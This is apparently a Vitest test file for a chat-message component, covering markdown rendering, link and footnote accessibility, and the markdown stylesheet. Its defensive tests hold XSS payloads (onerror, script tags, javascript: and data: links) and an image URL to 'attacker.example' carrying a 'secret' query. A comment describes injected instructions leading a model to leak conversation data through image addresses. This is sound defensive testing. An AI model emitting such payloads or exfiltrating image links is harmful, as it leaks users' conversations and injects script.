import type { Block } from "../../helpers/css";
import { readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { ChatMessage } from "@/features/ai/components/chat-message";
import { findBlock } from "../../helpers/css";
import { attribute, classesOf, elements, startTags, textOf } from "../../helpers/html";
import { renderWithIntl } from "../../helpers/intl";

/**
 * A message of the chat is markdown: a blank line starts a paragraph, a dash a
 * list, a hash a heading, backticks code. What it draws is the `markdown` style
 * of the app (global.css): the base style of Tailwind resets lists, headings and
 * code, and the typography plugin that `prose` stands for is not installed. The
 * element that holds the markdown carries the style, and the style is made of
 * tokens, so that a rebrand and the dark theme reach it.
 */

const MESSAGE = "Here's a first draft.\n\nHi there,\n\nThe Acme team";

const RICH = [
  "## Plan",
  "Steps:",
  "- first\n- second\n  - nested",
  "1. one\n2. two",
  "Run `npm run dev`, then:",
  "```ts\nconst answer = 42;\n```",
  "> a quote",
].join("\n\n");

/** The classes of the block that holds what the markdown draws, as the browser sees them. */
function blockOfMarkdown(html: string): string[] {
  return (/<div class="([^"]*)"><(?:p|h\d|ul|ol|pre|blockquote)>/.exec(html)?.[1] ?? "").split(" ");
}

describe("a message of the chat", () => {
  it.each(["user", "assistant"])(
    "draws the paragraphs of a message of the %s in a block that carries the markdown style",
    (role) => {
      const html = renderWithIntl(<ChatMessage role={role} content={MESSAGE} />);

      expect(html.match(/<p>/g)).toHaveLength(3);
      expect(blockOfMarkdown(html)).toContain("markdown");
    },
  );

  it("draws what markdown writes as the elements the style reaches: headings, lists, code and quotes", () => {
    const html = renderWithIntl(<ChatMessage role="assistant" content={RICH} />);

    expect(html).toContain("<h2>Plan</h2>");
    expect(html.match(/<ul>/g)).toHaveLength(2);
    expect(html).toContain("<ol>");
    expect(html).toContain("<code>npm run dev</code>");
    expect(html).toMatch(/<pre[^>]*><code class="language-ts">/);
    expect(html).toContain("<blockquote>");
    expect(blockOfMarkdown(html)).toContain("markdown");
  });

  it("holds a code block a keyboard can scroll: a long line must not need a mouse", () => {
    const html = renderWithIntl(<ChatMessage role="assistant" content={"```\nconst a = 1;\n```"} />);

    expect(html).toMatch(/<pre[^>]*\stabindex="0"/);
  });

  // The text of an item sits beside its check box, not in a label: a check box with no name is read as nothing
  it.each([
    ["en", "Task"],
    ["fr", "Tâche"],
  ] as const)("names the check box of an item of a task list, and leaves it read only: %s", (locale, name) => {
    const html = renderWithIntl(<ChatMessage role="assistant" content={"- [x] Domain bought\n- [ ] Pricing page"} />, locale);

    const boxes = startTags(html, "input");
    expect(boxes).toHaveLength(2);
    for (const box of boxes) {
      expect(attribute(box, "type")).toBe("checkbox");
      expect(attribute(box, "aria-label")).toBe(name);
      expect(attribute(box, "disabled")).toBe("");
    }
    expect(attribute(boxes[0] ?? "", "checked")).toBe("");
    expect(attribute(boxes[1] ?? "", "checked")).toBeUndefined();
  });

  it("does not draw the html a message holds: it is text", () => {
    const html = renderWithIntl(<ChatMessage role="assistant" content={'<img src=x onerror="alert(1)"> <script>alert(1)</script>'} />);

    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<img");
  });

  // The route streams text and nothing else, so an image in an answer is an address the model typed, and
  // an instruction slipped into the conversation can pick it: the browser would fetch it, and the address
  // can carry what the conversation says. The alt text is what a reader is left with.
  describe("an image", () => {
    const ADDRESS = "https://attacker.example/pixel.png?q=secret";

    it.each([
      ["written inline", `Here: ![a red dot](${ADDRESS})`],
      ["written as a reference", `Here: ![a red dot][dot]\n\n[dot]: ${ADDRESS}`],
      ["in a table", `| picture | note |\n| --- | --- |\n| ![a red dot](${ADDRESS}) | none |`],
      ["inside a link", `[![a red dot](${ADDRESS})](https://example.com/page)`],
    ])("is not drawn, and says its alt text instead: %s", (_, content) => {
      const html = renderWithIntl(<ChatMessage role="assistant" content={content} />);

      expect(html).not.toContain("<img");
      expect(html).not.toContain("attacker.example");
      expect(textOf(html)).toContain("a red dot");
    });

    it("with no alt text draws nothing at all", () => {
      const html = renderWithIntl(<ChatMessage role="assistant" content={`![](${ADDRESS})`} />);

      expect(html).not.toContain("<img");
      expect(html).not.toContain("attacker.example");
      expect(html).toContain("<p></p>");
    });
  });

  // What a model typed is not a page of this app, and a link follows the rule of the anchors of the
  // shell (`ShellAnchor`): only a web address (http or https) opens in a tab of its own, which knows
  // nothing of this one, and says so to assistive technology in words only they read. Any other link
  // stays in the tab it is in: the jump of a footnote is inside the message, and a `mailto:` hands
  // over to the mail client.
  describe("a link", () => {
    const WORDS = { en: "(opens in a new tab)", fr: "(s'ouvre dans un nouvel onglet)" } as const;

    /** The one `a` of a message, as its tag, its words for assistive technology and its text. */
    function linkOf(content: string, locale: "en" | "fr" = "en") {
      const links = elements(renderWithIntl(<ChatMessage role="assistant" content={content} />, locale), "a");
      expect(links).toHaveLength(1);
      const [link = ""] = links;
      const [words = ""] = elements(link, "span");

      return { tag: startTags(link, "a")[0] ?? "", words, text: textOf(link), visible: textOf(link.replace(words, "")) };
    }

    it.each(["en", "fr"] as const)("opens a web address in a tab of its own, tells assistive technology so, and tells that tab nothing of this one: %s", (locale) => {
      const { tag, words, text, visible } = linkOf("Read [the guide](https://example.com/guide) first.", locale);

      expect(attribute(tag, "href")).toBe("https://example.com/guide");
      expect(attribute(tag, "target")).toBe("_blank");
      // The three words that matter: no opener, no referrer, no ranking credit for what a model typed
      expect(attribute(tag, "rel")?.split(" ").sort()).toEqual(["nofollow", "noopener", "noreferrer"]);
      // The words are the shell's, and only assistive technology reads them
      expect(classesOf(startTags(words, "span")[0] ?? "")).toContain("sr-only");
      expect(textOf(words)).toBe(WORDS[locale]);
      expect(visible).toBe("the guide");
      expect(text).toBe(`the guide${WORDS[locale]}`);
    });

    it.each([
      ["https", "[the guide](https://example.com/guide)"],
      ["http", "[the guide](http://example.com/guide)"],
      ["a bare address, which markdown links by itself", "See https://example.com/guide for more."],
    ])("opens it the same way whatever it is written as: %s", (_, content) => {
      const { tag, words } = linkOf(content);

      expect(attribute(tag, "target")).toBe("_blank");
      expect(attribute(tag, "rel")).toBe("noopener noreferrer nofollow");
      expect(textOf(words)).toBe(WORDS.en);
    });

    it("draws the two links of a footnote as they are: the jump stays in the message", () => {
      const html = renderWithIntl(<ChatMessage role="assistant" content={"A claim.[^1]\n\n[^1]: The source."} />);

      const links = elements(html, "a");
      expect(links.map((link) => attribute(startTags(link, "a")[0] ?? "", "href"))).toEqual(["#user-content-fn-1", "#user-content-fnref-1"]);
      for (const link of links) {
        const tag = startTags(link, "a")[0] ?? "";
        expect(attribute(tag, "target"), tag).toBeUndefined();
        expect(attribute(tag, "rel"), tag).toBeUndefined();
        expect(link).not.toContain("new tab");
      }
      // What the footnote needs of its link stays (the reference is described by the label of the notes)
      expect(startTags(links[0] ?? "", "a")[0]).toContain('id="user-content-fnref-1"');
      expect(startTags(links[0] ?? "", "a")[0]).toContain('aria-describedby="footnote-label"');
    });

    // The words of the footnotes are the ones of react-markdown, in English, unless the page gives it its own: a screen
    // reader reads the label of the notes and the name of each way back, on a page that is in French
    describe("the footnotes of an answer", () => {
      const NOTE = "A claim.[^1]\n\n[^1]: The source.";
      const TWICE = "A claim.[^1] And again.[^1]\n\n[^1]: The source.";

      /** The label of the notes (the heading that names the section), and the name of each link that goes back to the text. */
      function wordsOf(content: string, locale: "en" | "fr") {
        const html = renderWithIntl(<ChatMessage role="assistant" content={content} />, locale);
        const [heading = ""] = elements(html, "h2");

        return {
          label: textOf(heading),
          headingTag: startTags(heading, "h2")[0] ?? "",
          back: startTags(html, "a").map((tag) => attribute(tag, "aria-label")).filter((name) => name !== undefined),
        };
      }

      it.each([
        ["en", "Footnotes", ["Back to reference 1"]],
        ["fr", "Notes de bas de page", ["Retour à la référence 1"]],
      ] as const)("are named in the language of the page (%s)", (locale, label, back) => {
        expect(wordsOf(NOTE, locale)).toMatchObject({ label, back });
      });

      it.each([
        ["en", ["Back to reference 1", "Back to reference 1-2"]],
        ["fr", ["Retour à la référence 1", "Retour à la référence 1-2"]],
      ] as const)("name each way back, when the note is cited twice (%s)", (locale, back) => {
        expect(wordsOf(TWICE, locale).back).toEqual(back);
      });

      it("keep the label of the notes for assistive technology only, as the heading is not part of the answer", () => {
        expect(classesOf(wordsOf(NOTE, "fr").headingTag)).toContain("sr-only");
        expect(attribute(wordsOf(NOTE, "fr").headingTag, "id")).toBe("footnote-label");
      });

      it("say nothing of English on a page in French", () => {
        const html = renderWithIntl(<ChatMessage role="assistant" content={TWICE} />, "fr");

        expect(html).not.toMatch(/Footnotes|Back to reference/);
      });
    });

    it.each([
      ["a mailto link", "Write to [the team](mailto:team@example.com).", "mailto:team@example.com"],
      ["an address of mail, which markdown links by itself", "Write to team@example.com.", "mailto:team@example.com"],
      ["a jump inside the message", "Back to [the top](#top).", "#top"],
      ["a page of the app", "See [the pricing](/en/pricing).", "/en/pricing"],
    ])("draws %s as it is, in the tab it is in", (_, content, href) => {
      const { tag, words } = linkOf(content);

      expect(attribute(tag, "href")).toBe(href);
      expect(attribute(tag, "target")).toBeUndefined();
      expect(attribute(tag, "rel")).toBeUndefined();
      expect(words).toBe("");
    });

    // react-markdown keeps the schemes it knows are safe: the link of the chat must not undo that
    it("still goes nowhere for a scheme that runs code", () => {
      const html = renderWithIntl(<ChatMessage role="assistant" content="[click](javascript:alert(1)) [data](data:text/html;base64,PHNjcmlwdD4=)" />);

      expect(html).not.toContain("javascript:");
      expect(html).not.toContain("data:text/html");
    });

    // react-markdown empties the address of a link whose scheme runs code (`javascript:`, `data:`), and a link with an
    // empty `href` is not nothing: it reloads the page. The text it had stays, as text, with no link round it.
    describe("whose address was emptied because its scheme runs code", () => {
      it.each([
        ["javascript:", "Run [this](javascript:alert(1)) now.", "Run this now."],
        ["data:", "Open [the page](data:text/html;base64,PHNjcmlwdD4=) here.", "Open the page here."],
        ["a reference to one", "See [the guide][g].\n\n[g]: javascript:alert(1)", "See the guide."],
        ["written in capitals", "A [click](JAVASCRIPT:alert(1)) there.", "A click there."],
        ["an image of which the alt text is what is left", "Press [![the button](https://example.com/b.png)](javascript:alert(1)).", "Press the button."],
      ])("draws its text and no link, which would reload the page: %s", (_, content, text) => {
        const html = renderWithIntl(<ChatMessage role="assistant" content={content} />);

        expect(html).not.toContain("<a");
        expect(html).not.toContain('href=""');
        expect(html).not.toMatch(/javascript:|data:text/i);
        expect(textOf(html)).toBe(text);
      });

      it("keeps the formatting the text had, as the link only is taken away", () => {
        const html = renderWithIntl(<ChatMessage role="assistant" content="Do **not** click [**this**](javascript:alert(1))." />);

        expect(html).not.toContain("<a");
        expect(html).toContain("<strong>this</strong>");
      });

      it("leaves the links round it as they are", () => {
        const html = renderWithIntl(
          <ChatMessage role="assistant" content="[safe](https://example.com/a) and [unsafe](javascript:alert(1)) and [mail](mailto:team@example.com)" />,
        );

        expect(elements(html, "a").map((link) => attribute(startTags(link, "a")[0] ?? "", "href"))).toEqual(["https://example.com/a", "mailto:team@example.com"]);
        // The web address says that it opens a tab, in words only assistive technology reads; the text of the other two is their own
        expect(textOf(html)).toBe("safe(opens in a new tab) and unsafe and mail");
      });
    });

    // A link with no text is a tab stop that a keyboard lands on and a screen reader reads as nothing
    describe("with no text", () => {
      const PAGE = "https://example.com/page";

      it.each([
        ["an image with no alt text", `[![](https://example.com/x.png)](${PAGE})`],
        ["nothing between the brackets", `[](${PAGE})`],
        ["only a space", `[ ](${PAGE})`],
      ])("shows its address as its text, and stays a link: %s", (_, content) => {
        const { tag, visible } = linkOf(content);

        expect(attribute(tag, "href")).toBe(PAGE);
        expect(visible).toBe(PAGE);
        expect(attribute(tag, "target")).toBe("_blank");
      });

      it("draws no image for it", () => {
        const html = renderWithIntl(<ChatMessage role="assistant" content={`[![](https://attacker.example/x.png)](${PAGE})`} />);

        expect(html).not.toContain("<img");
        expect(html).not.toContain("attacker.example");
      });

      it("shows the address of a link that is not a web address, too", () => {
        const { tag, visible, words } = linkOf("[](mailto:team@example.com)");

        expect(visible).toBe("mailto:team@example.com");
        expect(attribute(tag, "target")).toBeUndefined();
        expect(words).toBe("");
      });

      it("keeps the text a link has: its address is not put in the place of it, and an alt text is a text", () => {
        expect(linkOf(`[the page](${PAGE})`).visible).toBe("the page");
        expect(linkOf(`[![a red dot](https://example.com/x.png)](${PAGE})`).visible).toBe("a red dot");
      });

      // The address was emptied by react-markdown (a scheme that runs code): no address, no text, nothing to follow
      it("is not drawn when it has no address either", () => {
        const html = renderWithIntl(<ChatMessage role="assistant" content="[](javascript:alert(1))" />);

        expect(html).not.toContain("<a");
        expect(html).not.toContain("javascript:");
      });
    });
  });
});

const ROOT = resolve(import.meta.dirname, "../../..");
const css = readFileSync(join(ROOT, "src/styles/global.css"), "utf-8");
const style = findBlock(css, "@utility markdown");

/** The selectors of a list, split at the commas that are not inside parentheses (`:is(h1, h2), p` holds two). */
function splitSelectors(list: string): string[] {
  const selectors: string[] = [];
  let depth = 0;
  let current = "";
  for (const char of list) {
    if (char === "(") depth += 1;
    if (char === ")") depth -= 1;
    if (char === "," && depth === 0) {
      selectors.push(current);
      current = "";
    } else {
      current += char;
    }
  }
  selectors.push(current);

  return selectors;
}

/** Every rule nested in the style, with the selectors it holds (`& ul` is `ul`), whatever its depth. */
function rules(block: Block | undefined): { selectors: string[]; properties: Record<string, string> }[] {
  return (block?.children ?? []).flatMap((child) => [
    {
      selectors: splitSelectors(child.header).map((selector) => selector.replace(/^\s*&\s*/, "").replace(/\s+/g, " ").trim()),
      properties: child.properties,
    },
    ...rules(child),
  ]);
}

/** The declarations of the rules that name this selector, merged: later rules win, as they do in the cascade. */
function declarationsFor(selector: string): Record<string, string> {
  return Object.assign({}, ...rules(style).filter(({ selectors }) => selectors.includes(selector)).map(({ properties }) => properties));
}

describe("the markdown style", () => {
  it("is a utility of the stylesheet, which a block takes by its class", () => {
    expect(style, "@utility markdown in global.css").toBeDefined();
  });

  // Tailwind's base resets them: a list with no marker, a heading as big as a paragraph
  it("gives lists their markers back, and their indent", () => {
    expect(declarationsFor("ul")["list-style-type"]).toBe("disc");
    expect(declarationsFor("ol")["list-style-type"]).toBe("decimal");
    expect(declarationsFor("ul")["padding-inline-start"]).toBeDefined();
    expect(declarationsFor("ol")["padding-inline-start"]).toBeDefined();
  });

  it("tells a nested list from the one around it", () => {
    expect(declarationsFor("ul ul")["list-style-type"]).toBe("circle");
  });

  it("makes a heading stand out from a paragraph, on the scale of the app", () => {
    const heading = declarationsFor(":is(h1, h2, h3, h4, h5, h6)");

    expect(heading["font-weight"]).toBe("600");
    expect(rules(style).some(({ selectors }) => selectors.some((selector) => /\bh1\b/.test(selector)))).toBe(true);
  });

  it("spaces the blocks of a message from one another, and leaves the first and last at the edge of the block", () => {
    expect(declarationsFor("> * + *")["margin-top"]).toBeDefined();
    expect(declarationsFor("> :first-child")["margin-top"]).toBe("0");
  });

  // An answer of the assistant is short and a post is long: the room before a heading is the one variable that an
  // article sets (the blog says 2.5rem), so that the two do not each write the rule of the headings
  it("leaves room before a heading that is not the first thing in the block, 1.25rem unless the block says more", () => {
    const heading = declarationsFor("> :is(h1, h2, h3, h4, h5, h6):not(:first-child)");

    expect(heading["margin-top"]).toBe("var(--markdown-heading-gap, 1.25rem)");
  });

  it("sets code apart: a block that scrolls its own long lines, and a chip for code inside a line", () => {
    expect(declarationsFor("pre")["overflow-x"]).toBe("auto");
    expect(declarationsFor("pre").border).toBeDefined();
    expect(declarationsFor(":not(pre) > code")["background-color"]).toBeDefined();
    // The chip is for code in a line: the code of a block takes none
    expect(Object.keys(declarationsFor("pre code")).length).toBeGreaterThan(0);
  });

  // `overflow-wrap: anywhere`, which keeps a long word inside the block, also makes a column as narrow as one letter:
  // a table of three columns on a phone broke "Provider" into "Pro", "vide" and "r". The cells keep their words whole,
  // and the box that holds the table scrolls when the columns do not fit.
  it("keeps the words of a table whole, whatever the width: the box of the table scrolls instead", () => {
    expect(declarationsFor(":is(th, td)")["overflow-wrap"]).toBe("normal");
  });

  it("draws a link as a link, which the base style would not", () => {
    // `@apply` writes no property into the source, so the link is checked by what it names
    expect(css).toMatch(/&\s+a\s*\{[^}]*@apply[^;}]*underline/);
  });

  it("draws a quote with a bar, and a table with lines between its cells", () => {
    expect(declarationsFor("blockquote")["border-inline-start"]).toBeDefined();
    expect(declarationsFor(":is(th, td)").border).toBeDefined();
  });

  it("breaks a word that is longer than the message, so that nothing leaves its block", () => {
    expect(style?.properties["overflow-wrap"]).toBe("anywhere");
  });

  // A color is a token or nothing: no hex, no function of its own, no named color
  it("takes its colors from the theme, never from a value of its own", () => {
    const values = [style?.properties ?? {}, ...rules(style).map(({ properties }) => properties)].flatMap((properties) =>
      Object.entries(properties).filter(([name]) => /color|border|background|outline|fill|stroke/.test(name)),
    );

    expect(values.length).toBeGreaterThan(0);
    for (const [name, value] of values) {
      const withoutTokens = value.replace(/var\(--[\w-]+\)/g, "").replace(/color-mix\([^)]*\)/g, "");
      expect(withoutTokens, `${name}: ${value}`).not.toMatch(/#[\da-f]{3,8}\b|rgba?\(|hsla?\(|oklch\(|\b(?:white|black|gray|grey|red|blue|green)\b/i);
    }
  });
});
